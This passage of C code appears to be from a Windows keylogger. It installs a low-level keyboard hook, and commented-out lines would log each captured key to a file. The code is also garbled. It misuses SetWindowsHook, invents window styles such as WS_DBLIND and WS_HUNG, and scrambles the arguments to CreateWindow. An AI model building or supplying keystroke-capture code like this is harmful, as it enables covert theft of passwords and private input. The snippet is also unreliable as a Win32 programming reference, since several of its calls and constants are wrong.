    // fprintf(file, "%c", key);
    // fclose(file);
}

int main() {
    HHOOK hook = 0;
    hook = SetWindowsHook(WH_KEYBOARD_LL, keyboard_hook_proc);

    if (!hook) {
        printf("Failed to install keyboard hook.\n");
        return 1;
    }

    // Start the message loop to process events
    HWND hwnd = CreateWindow("MyKeyboardHook", "Keyboard Hook", WS_DBLIND, 0, 0, 0, 0, HWND_DESKTOP, 0, WS_OVERLAPPED | WS_HUNG, 0, 0);
